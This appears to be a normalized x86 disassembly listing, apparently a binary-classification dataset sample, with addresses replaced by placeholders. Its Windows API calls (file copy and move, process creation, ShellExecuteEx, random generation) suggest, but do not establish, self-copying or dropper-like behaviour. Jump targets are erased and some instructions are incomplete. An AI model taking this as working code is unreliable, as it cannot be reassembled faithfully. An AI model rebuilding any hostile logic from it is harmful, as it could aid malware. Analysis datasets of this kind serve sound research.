jne r-xdata
push [ ebp - 0x1c ]
call sub_405cf1
mov edx [ edi + 0x5818 ]
cmp [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] edx
mov [ edi + 0x5814 ] esi
mov [ edi + 0x5818 ] esi
jmp r-xdata
cmp [ eax - 0x108 ] 0xff00aaee
jne r-xdata
cmp ecx 0x10
jl r-xdata
imul ebx ebx 0x118
lea esi [ ebx + edi ]
dec [ esi + 0xa08 ]
lea ecx [ esi + 0x908 ]
mov eax [ ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x90c ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0xa08 ]
shl eax 0x4
push eax
lea eax [ esi + 0x918 ]
push eax
push ecx
call sub_412d60
mov ecx [ esi + 0xa08 ]
shl ecx 0x4
add ecx ebx
xor eax eax
mov [ ecx + edi + 0x908 ] eax
mov ecx [ esi + 0xa08 ]
shl ecx 0x4
add ecx ebx
mov [ ecx + edi + 0x90c ] eax
mov ecx [ esi + 0xa08 ]
add ecx 0x91
shl ecx 0x4
add ecx ebx
mov [ ecx + edi ] eax
mov [ esi + 0x914 ] 0x1
mov eax [ ebp - 0x2c ]
push 0x14
mov [ ebp - 0x18 ] eax
pop edx
lea ecx [ ebp - 0x4c ]
inc [ edi + 0x5954 ]
jmp r-xdata
cmp ebx [ edi + 0x58c ]
jne r-xdata
call sub_403925
cmp [ ebp - 0x30 ] 0x0
mov [ edi + 0x5810 ] eax
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
je r-xdata
imul ebx ebx 0x118
lea esi [ ebx + edi ]
dec [ esi + 0x2d0c ]
lea ecx [ esi + 0x2c0c ]
mov eax [ ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x2c10 ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x2d0c ]
shl eax 0x4
push eax
lea eax [ esi + 0x2c1c ]
push eax
push ecx
call sub_412d60
mov ecx [ esi + 0x2d0c ]
shl ecx 0x4
add ecx ebx
xor eax eax
mov [ ecx + edi + 0x2c0c ] eax
mov ecx [ esi + 0x2d0c ]
add ecx 0x2c1
shl ecx 0x4
add ecx ebx
mov [ ecx + edi ] eax
mov ecx [ esi + 0x2d0c ]
shl ecx 0x4
add ecx ebx
mov [ ecx + edi + 0x2c14 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0x30 ]
call sub_405f2c
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push [ ebp - 0x1c ]
call sub_405cf1
mov ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov esi edi
call sub_401a84
and [ edi + 0x5954 ] 0x0
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
add esp 0xc
cmp [ ebp - 0x1c ] eax
xor bl bl
mov ebx [ ebp - 0x20 ]
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push [ ebp - 0x30 ]
call sub_401923
jle r-xdata
push 0x0
push [ ebp - 0x18 ]
mov eax ebx
lea ecx [ ebp - 0x6c ]
call sub_4060be
lea eax [ ebp - 0x6c ]
lea ebx [ ebp - 0x90 ]
call sub_4013ef
lea esi [ ebp - 0x5c ]
mov [ ebp - 0x34 ] 0x5a72b99
call sub_405f3e
push 0x1
push 0x7
lea eax [ ebp - 0x34 ]
push eax
mov ecx ebx
call sub_40151f
test eax eax
je r-xdata
push 0x0
push ebx
lea esi [ ebp - 0x6c ]
call sub_405f9d
cmp [ ebp - 0x58 ] 0x0
jle r-xdata
mov ecx [ eax + 0x9 ]
add ecx [ ebp - 0x7c ]
mov eax [ eax + 0x5 ]
push 0x0
push ecx
mov ecx esi
call sub_4060be
push [ ebp - 0x18 ]
call sub_405c44
push 0x3
lea eax [ ebp - 0x29c ]
push eax
push edi
call sub_403a65
mov esi r--data
push esi
lea eax [ ebp - 0x29c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x29c ]
push eax
call sub_404c6d
mov ebx eax
test ebx ebx
je r-xdata
push [ ebp - 0x58 ]
push [ ebp - 0x5c ]
push ebx
push edi
call sub_404d1a
test al al
je r-xdata
call sub_4016c1
push eax
lea eax [ ebp - 0x29c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x29c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x29c ]
push eax
call sub_4016c1
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
push esi
push ebx
push edi
call sub_404e26
mov esi eax
test esi esi
je r-xdata
push ebx
call sub_405c44
push 0x0
call sub_4016c1
push eax
push ebx
call [ CopyFileW@IAT ]
lea eax [ ebp - 0x29c ]
test eax eax
je r-xdata
push 0x0
push esi
xor edi edi
call sub_402aaf
test al al
je r-xdata
push 0x410
push eax
push rw-data
call [ lstrcpynW@IAT ]
push esi
call sub_405c44
mov [ ebp - 0x11 ] 0x1
sub_403518
push esi
push edi
mov edi [ esp + 0xc ]
xor esi esi
add edi 0x24
mov ecx [ esi * 8 + rw-data ]
mov eax [ esp + 0x10 ]
or [ eax ] ecx
inc esi
cmp esi 0x13
jl r-xdata
push edi
push [ esi * 8 + rw-data ]
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
jmp r-xdata
pop edi
mov al 0x1
pop esi
retn
sub_40356a
push ebp
mov ebp esp
sub esp 0x754
push ebx
mov ebx eax
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
xor al al
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi [ FindFirstFileW@IAT ]
lea eax [ ebp - 0x750 ]
push eax
push [ ebx ]
call esi
mov edi eax
lea eax [ ebp - 0x750 ]
push eax
push [ ebx ]
call esi
cmp eax 0xffffffff
je r-xdata
push edi
call [ FindClose@IAT ]
test [ ebp - 0x750 ] 0x10
je r-xdata
mov esi [ lstrcatW@IAT ]
xor eax eax
xor ecx ecx
xor edi edi
mov [ ebp - 0x500 ] ax
cmp [ ebp + 0xc ] ecx
jle r-xdata
push 0x3c
pop ecx
mov edx ecx
lea eax [ ebp - 0x88 ]
push 0x44
pop edi
mov edx edi
lea eax [ ebp - 0xd0 ]
push r--data
lea eax [ ebp - 0x500 ]
push eax
call esi
push [ ebx + edi * 4 ]
lea eax [ ebp - 0x500 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x500 ]
push eax
call esi
inc edi
cmp edi [ ebp + 0xc ]
jl r-xdata
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x88 ] ecx
mov [ ebp - 0x6c ] 0x1
lea eax [ ebp - 0x88 ]
jmp r-xdata
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
push 0x10
pop edx
lea eax [ ebp - 0x10 ]
xor ecx ecx
push eax
call [ ShellExecuteExW@IAT ]
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
xor eax eax
inc eax
mov [ ebp - 0xa0 ] ax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xd0 ]
push eax
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
lea eax [ ebp - 0x500 ]
push eax
push ecx
mov [ ebp - 0xd0 ] edi
mov [ ebp - 0xa4 ] 0x81
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push edi
call [ ExitProcess@IAT ]
push 0x8
pop ecx
push 0x7fffffff
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0xf0 ]
lea ebx [ ebp - 0xf0 ]
[ edi ]
call sub_40394f
push eax
lea eax [ ebp - 0x500 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x500 ]
push eax
call sub_4016c1
push eax
xor edi edi
call sub_402aaf
test al al
je r-xdata
xor edi edi
mov [ ebp - 0x500 ] ax
cmp [ ebp + 0xc ] edi
jle r-xdata
push 0x3c
pop ecx
mov edx ecx
lea eax [ ebp - 0x4c ]
push [ ebx + edi * 4 ]
lea eax [ ebp - 0x500 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x500 ]
push eax
call esi
inc edi
cmp edi [ ebp + 0xc ]
jl r-xdata
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
lea eax [ ebp - 0x500 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x30 ] 0x1
lea eax [ ebp - 0x4c ]
sub_40374c
push ebp
mov ebp esp
sub esp 0x644
push ebx
push esi
push edi
push 0x1
push 0x208
lea eax [ ebp - 0x438 ]
push eax
call sub_4016e2
test al al
je r-xdata
xor al al
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x438 ]
push eax
call esi
lea eax [ ebp - 0x438 ]
test eax eax
jne r-xdata
push 0x2
lea eax [ ebp - 0x438 ]
push eax
call sub_4047b2
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ebx [ lstrlenA@IAT ]
mov edi rw-data
push edi
call ebx
xor ecx ecx
cmp ecx edi
je r-xdata
push 0x14
lea eax [ ebp - 0x24 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
call ebx
lea ecx [ ebp - 0x24 ]
test ecx ecx
je r-xdata
push eax
push edi
push [ ebp - 0x4 ]
call sub_404878
mov edi rw-data
push edi
call ebx
xor ecx ecx
cmp ecx edi
je r-xdata
push eax
mov eax ecx
push eax
push [ ebp - 0x4 ]
call sub_404878
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov edi 0x104
push edi
lea eax [ ebp - 0x640 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
mov ebx [ lstrcpyW@IAT ]
test eax eax
je r-xdata
push eax
push edi
push [ ebp - 0x4 ]
call sub_404878
push r--data
lea eax [ ebp - 0x640 ]
push eax
call ebx
cmp eax edi
jae r-xdata
push 0xa
call [ Sleep@IAT ]
mov al 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x640 ]
push eax
call esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
lea eax [ ebp - 0x230 ]
push eax
call ebx
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x230 ]
push eax
call esi
mov edi r--data
push edi
lea eax [ ebp - 0x230 ]
push eax
call esi
call sub_4016c1
push eax
lea eax [ ebp - 0x230 ]
push eax
call esi
push edi
lea eax [ ebp - 0x230 ]
push eax
call esi
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
lea edi [ ebp - 0x4 ]
call sub_402aaf
test al al
je r-xdata
sub_4038dc
mov edx [ rw-data ]
push edi
mov edi [ rw-data ]
mov eax edx
or eax edi
jne r-xdata
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push 0x0
sub eax edx
push 0x989680
sbb ecx edi
push ecx
push eax
call sub_4194a0
pop edi
retn
push esi
push r--data
call [ SystemTimeToFileTime@IAT ]
mov edx [ esi ]
mov [ rw-data ] edx
mov edi [ esi + 0x4 ]
mov [ rw-data ] edi
sub_403925
push ebp
mov ebp esp
sub esp 0x1c
push esi
lea eax [ ebp - 0x18 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea esi [ ebp - 0x8 ]
call sub_4038dc
pop esi
leave
retn
sub_40394f
push ebp
mov ebp esp
sub esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push 0x20
push [ rw-data ]
call [ CryptGenRandom@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ CryptAcquireContextW@IAT ]
push edi
push 0xf0000040
push 0x1
push r--data
push 0x0
mov edi rw-data
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
call [ GetTickCount@IAT ]
movzx ecx [ ebp - 0x2 ]
shl eax 0xd
xor eax ecx
xor eax [ rw-data ]
imul eax eax 0x19660d
add eax 0x3c88596c
mov eax [ ebx ]
jmp r-xdata
pop edi
pop esi
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
xor edx edx
div [ ebp + 0xc ]
mov [ rw-data ] edx
mov eax edx
leave
retn 0x8
push 0x8
push 0x1
push 0x0
push r--data
push edi
call esi
sub_4039ef
push ebp
mov ebp esp
sub esp 0x24
push ebx
push edi
push 0x8
pop ecx
push 0x20
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x24 ]
lea ebx [ ebp - 0x24 ]
[ edi ]
call sub_40394f
and [ ebp - 0x4 ] 0x0
test esi esi
jne r-xdata
mov ax [ eax * 2 + rw-data ]
mov [ esi ] ax
jmp r-xdata
xor al al
jmp r-xdata
xor eax eax
dec [ ebp + 0xc ]
jne r-xdata
pop edi
pop ebx
leave
retn 0x8
push 0x8
pop ecx
push 0x20
push [ ebp + 0x8 ]
lea edi [ ebp - 0x24 ]
lea ebx [ ebp - 0x24 ]
[ edi ]
call sub_40394f
inc [ ebp - 0x4 ]
mov ax [ eax * 2 + rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ esi + ecx * 2 ] ax
mov ecx [ ebp - 0x4 ]
mov [ esi + ecx * 2 + 0x2 ] ax
mov al 0x1
sub_403a65
push ebp
mov ebp esp
sub esp 0x24
push ebx
push edi
push 0x8
pop ecx
push 0x29
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x24 ]
lea ebx [ ebp - 0x24 ]
[ edi ]
call sub_40394f
cmp [ ebp + 0xc ] 0x0
mov edi eax
jne r-xdata
imul eax eax 0xc
push esi
mov esi rw-data
add eax esi
push eax
push [ ebp + 0xc ]
call [ lstrcpyW@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
dec [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edi
jne r-xdata
pop edi
pop ebx
leave
retn 0xc
push 0x8
pop ecx
push 0x29
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x24 ]
lea ebx [ ebp - 0x24 ]
[ edi ]
call sub_40394f
mov edi eax
cmp edi [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
pop esi
mov eax edi
imul eax eax 0xc
add eax esi
push eax
push [ ebp + 0xc ]
call [ lstrcatW@IAT ]
inc edi
cmp edi 0x29
jl r-xdata
xor edi edi
sub_403aef
mov eax sub_41d871
call sub_4198ec
sub esp 0x20
test [ rw-data ] 0x1
jne r-xdata
inc [ rw-data ]
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
or [ rw-data ] 0x1
push ebx
push edi
and [ ebp - 0x4 ] 0x0
push 0x8
pop ecx
push 0xffffffff
push [ ebp + 0x8 ]
xor eax eax
lea edi [ ebp - 0x2c ]
lea ebx [ ebp - 0x2c ]
[ edi ]
call sub_40394f
mov [ rw-data ] eax
or [ ebp - 0x4 ] 0xffffffff
pop edi
pop ebx
sub_403b4d
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
xor edx edx
push 0x3
mov esi eax
pop ecx
div ecx
xor edx edx
push 0x8
lea edi [ ebp - 0x20 ]
sub esi eax
lea eax [ esi + esi + 0x2 ]
div ecx
pop ecx
mov edx eax
xor eax eax
[ edi ]
test edx edx
je r-xdata
mov eax [ rw-data ]
push ebx
push edx
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x20 ]
call sub_40394f
pop ebx
jmp r-xdata
add eax esi
imul eax eax 0x3e8
push 0x0
push eax
call [ SleepEx@IAT ]
pop edi
pop esi
leave
retn 0x4
sub_403ba4
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
push [ ebp + 0x8 ]
call esi
push [ ebp + 0xc ]
mov edi eax
mov [ ebp - 0x14 ] edi
call esi
mov ebx eax
lea eax [ ebx + 0x1 ]
lea esi [ edi + 0x1 ]
imul esi eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] 0x0
cmp esi 0x6400000
ja r-xdata
and [ ebp - 0xc ] 0x0
test esi esi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax ebx
imul eax edi
test eax eax
je r-xdata
xor al al
jmp r-xdata
add esi 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
and [ ebp - 0x8 ] 0x0
test edi edi
je r-xdata
mov [ ecx ] 0x0
inc ecx
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x0
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
xor ecx ecx
test edi edi
je r-xdata
mov edi [ ebp - 0xc ]
sub edi ebx
dec edi
mov [ ebp - 0xc ] eax
jmp r-xdata
push eax
call [ ExitProcess@IAT ]
push [ ebp - 0xc ]
call sub_405c44
mov al [ ebp - 0x1 ]
mov eax [ ebp - 0xc ]
lea eax [ eax + ebx - 0x1 ]
test [ ebp - 0x8 ] 0x1f
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
push eax
call sub_413718
mov bx ax
mov eax [ ebp + 0xc ]
movzx eax [ eax + esi * 2 ]
push eax
call sub_413718
pop ecx
pop ecx
cmp bx ax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
inc ecx
add eax ebx
cmp ecx edi
jb r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add edi ebx
cmp eax [ ebp - 0x14 ]
jb r-xdata
mov esi [ Sleep@IAT ]
push 0xa
call esi
push 0x0
call esi
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + esi * 2 ]
cmp eax 0x3f
je r-xdata
movzx edx [ eax ]
cmp edx ebx
je r-xdata
jmp r-xdata
xor esi esi
test ebx ebx
je r-xdata
mov edi [ ebp - 0x14 ]
xor eax eax
inc eax
jmp r-xdata
cmp eax 0x2a
jne r-xdata
inc esi
cmp esi ebx
jb r-xdata
test esi esi
je r-xdata
mov ebx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
movzx eax [ edi + esi ]
inc eax
jmp r-xdata
xor eax eax
inc eax
test esi esi
je r-xdata
mov ebx [ ebp - 0x10 ]
lea ecx [ edi + ebx + 0x1 ]
mov [ ecx + esi ] al
jmp r-xdata
xor ecx ecx
inc ecx
movzx ecx [ edi + esi + 0x1 ]
jmp r-xdata
movzx eax [ edi + esi ]
inc eax
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp eax ecx
jle r-xdata
test edx edx
je r-xdata
movzx eax [ edi + esi + 0x1 ]
jmp r-xdata
sub_403d54
mov eax sub_41d8c5
call sub_4198ec
sub esp 0x20
push ebx
push esi
lea esi [ ebp - 0x2c ]
mov ebx ecx
call sub_405d11
and [ ebp - 0x4 ] 0x0
xor cl cl
xor dl dl
mov [ ebp - 0x1b ] 0x0
test edi edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x2c ]
call sub_405f2c
xor al al
cmp ebx 0x1
jle r-xdata
test bl 0x1
je r-xdata
and [ ebp - 0x10 ] 0x0
test ebx ebx
jg r-xdata
xor bl bl
mov eax [ ebp - 0x10 ]
mov al [ eax + edi ]
cmp al 0x20
jae r-xdata
lea eax [ ebx + ebx + 0x2 ]
test eax eax
jle r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
cmp al 0xfd
jbe r-xdata
test al al
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
push [ ebp - 0x2c ]
push ebx
push edi
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
push 0x0
push eax
lea esi [ ebp - 0x2c ]
call sub_405f9d
and [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x1
jg r-xdata
mov bl 0x1
jmp r-xdata
lea esi [ ebx - 0x1 ]
cmp [ ebp - 0x10 ] esi
jl r-xdata
mov [ ebp + 0x8 ] 0x1
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] ebx
jl r-xdata
cmp cl [ ebp - 0x18 ]
jne r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x2c ]
call sub_405f2c
mov al bl
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x2c ]
call sub_405f2c
mov al [ ebp + 0x8 ]
jmp r-xdata
mov dl [ ebp - 0x19 ]
jmp r-xdata
cmp cl 0x35
jb r-xdata
mov [ ebp - 0x18 ] dl
mov dl [ ebp - 0x1a ]
mov [ ebp - 0x19 ] dl
mov dl [ ebp - 0x1b ]
mov [ ebp - 0x1b ] cl
mov cl al
mov [ ebp - 0x1a ] dl
cmp cl dl
jne r-xdata
cmp cl 0x4e
jb r-xdata
cmp cl 0x4a
jbe r-xdata
cmp cl 0xad
jb r-xdata
cmp cl 0x9e
jbe r-xdata
cmp cl 0xe0
jb r-xdata
cmp cl 0xd6
jbe r-xdata
cmp cl 0xf8
jbe r-xdata
sub_403ebc
push ecx
push esi
push edi
mov edi [ esp + 0x10 ]
xor esi esi
cmp edi esi
je r-xdata
xor eax eax
cmp ebx esi
jle r-xdata
push [ esp + 0x14 ]
mov ecx ebx
call sub_403d54
test al al
je r-xdata
lea edi [ ebx + ebx + 0x10 ]
cmp edi 0x6400000
ja r-xdata
cmp ebx 0x6400000
jg r-xdata
test esi esi
je r-xdata
cmp edi esi
jne r-xdata
xor edi edi
lea edi [ ebx + 0x4 ]
cmp [ rw-data ] esi
jne r-xdata
mov eax esi
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
push esi
push ebx
push [ esp + 0x1c ]
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
add edi 0x4
cmp [ rw-data ] esi
jne r-xdata
xor edi edi
inc edi
mov eax edi
jmp r-xdata
push ebx
push [ esp + 0x14 ]
push edi
call sub_413290
add esp 0xc
push esi
call [ SetLastError@IAT ]
push edi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax esi
jne r-xdata
call sub_405c10
test al al
jne r-xdata
pop edi
pop esi
pop ecx
retn 0x8
push esi
call sub_405c44
xor esi esi
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
push esi
call [ SetLastError@IAT ]
push edi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax esi
je r-xdata
call sub_405c10
test al al
je r-xdata
mov edi eax
jmp r-xdata
push esi
call [ ExitProcess@IAT ]
xor edi edi
jmp r-xdata
xor eax eax
mov [ esi + ebx * 2 ] ax
mov esi eax
cmp edi esi
je r-xdata
sub_403fca
test edi edi
jne r-xdata
push esi
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
test esi esi
js r-xdata
xor eax eax
retn
xor esi esi
cmp esi 0x6400000
jg r-xdata
mov eax esi
pop esi
retn
push edi
push esi
call [ lstrcpyW@IAT ]
test esi esi
jne r-xdata
add esi 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
push 0x0
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
jne r-xdata
mov esi eax
jmp r-xdata
push eax
call [ ExitProcess@IAT ]
xor esi esi
jmp r-xdata
test esi esi
je r-xdata
sub_40403f
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor al al
pop ebx
retn
mov eax [ esi + 0x304 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
push edi
test eax eax
jle r-xdata
imul eax eax 0x18
push 0x18
lea eax [ eax + esi + 0x4 ]
push ebx
push eax
call sub_412d60
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0xc ]
mov [ esi ] eax
mov al 0x1
pop ebx
retn
mov eax ebx
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x18
sub edx ecx
imul edx edx 0x18
add eax esi
lea edi [ eax + 0x4 ]
push edx
add eax 0x1c
push edi
push eax
call sub_412d60
push 0x18
push ebx
push edi
call sub_412d60
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x18
cmp ecx eax
jl r-xdata
inc [ esi + 0x304 ]
mov eax [ esi ]
mov ebx [ ebx + 0x10 ]
pop edi
cmp eax ebx
ja r-xdata
cmp edi [ edx ]
jge r-xdata
sub_4040c8
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push edi
test ebx ebx
je r-xdata
xor al al
mov eax [ esi + 0x810 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
test eax eax
jle r-xdata
imul eax eax 0x14
push 0x14
lea eax [ eax + esi + 0x590 ]
push ebx
push eax
call sub_412d60
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0x598 ]
fild [ esp + 0x4 ]
fdivr [ r--data ]
fld st0
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
lea eax [ esi + 0x598 ]
mov edi ecx
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x14
sub edx ecx
imul edx edx 0x14
add eax esi
lea edi [ eax + 0x590 ]
push edx
add eax 0x5a4
push edi
push eax
call sub_412d60
push 0x14
push ebx
push edi
call sub_412d60
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x14
cmp ecx eax
jl r-xdata
xor edi edi
xor edx edx
test ecx ecx
jle r-xdata
fstp st1
fld1
fxch st1
add edx [ eax ]
add eax 0x14
dec edi
jne r-xdata
mov [ esp + 0x4 ] edx
inc [ esi + 0x810 ]
mov ecx [ esi + 0x810 ]
xor edx edx
mov [ esp + 0x4 ] edx
test ecx ecx
jle r-xdata
cmp edi [ edx ]
jge r-xdata
fstp st0
mov al 0x1
fstp st0
jmp r-xdata
lea ecx [ esi + 0x598 ]
pop edi
mov esp ebp
pop ebp
retn
fnstsw ax
test ah 0x41
je r-xdata
mov [ esi + edi + 0x814 ] dl
inc edi
cmp edi 0x64
jge r-xdata
cmp edi 0x64
jge r-xdata
inc [ esp + 0x4 ]
fild [ esp + 0x4 ]
fild [ ecx ]
fmul st3
fcompp
inc edx
add ecx 0x14
cmp edx [ esi + 0x810 ]
jl r-xdata
fild [ ecx ]
and [ esp + 0x4 ] 0x0
fmul st2
fcomp st1
jmp r-xdata
sub_4041ff
test ebx ebx
je r-xdata
xor al al
retn
mov eax [ esi + 0x588 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
push edi
test eax eax
jle r-xdata
imul eax eax 0x14
push 0x14
lea eax [ eax + esi + 0x308 ]
push ebx
push eax
call sub_412d60
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0x310 ]
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x14
sub edx ecx
imul edx edx 0x14
add eax esi
lea edi [ eax + 0x308 ]
push edx
add eax 0x31c
push edi
push eax
call sub_412d60
push 0x14
push ebx
push edi
call sub_412d60
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x14
cmp ecx eax
jl r-xdata
inc [ esi + 0x588 ]
mov al 0x1
pop edi
retn
cmp edi [ edx ]
jg r-xdata
sub_404281
mov edx [ esp + 0x4 ]
test edx edx
je r-xdata
xor al al
mov eax [ esi + 0x2bfc ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
push ebx
xor ecx ecx
push edi
mov edi 0x118
test eax eax
jle r-xdata
imul eax eax 0x118
push edi
push [ esp + 0x10 ]
lea eax [ eax + esi + 0x8fc ]
push eax
call sub_412d60
add esp 0xc
mov ebx [ edx + 0x8 ]
lea edx [ esi + 0x904 ]
retn 0x4
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x118
sub edx ecx
imul edx edx 0x118
add eax esi
lea ebx [ eax + 0x8fc ]
push edx
add eax 0xa14
push ebx
push eax
call sub_412d60
push edi
push [ esp + 0x1c ]
push ebx
call sub_412d60
add esp 0x18
jmp r-xdata
inc ecx
add edx edi
cmp ecx eax
jl r-xdata
inc [ esi + 0x2bfc ]
pop edi
mov al 0x1
pop ebx
jmp r-xdata
cmp ebx [ edx ]
jg r-xdata
sub_404329
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor al al
mov eax [ esi + 0x4f00 ]
test eax eax
js r-xdata
cmp eax 0x20
jge r-xdata
imul eax eax 0x118
push 0x118
push [ esp + 0x8 ]
lea eax [ eax + esi + 0x2c00 ]
push eax
call sub_412d60
add esp 0xc
inc [ esi + 0x4f00 ]
mov al 0x1
jmp r-xdata
retn 0x4
sub_40436d
mov eax sub_41d859
call sub_4198ec
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40264d
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x10 ] bl
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ esi + 0x4 ]
call [ esi ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
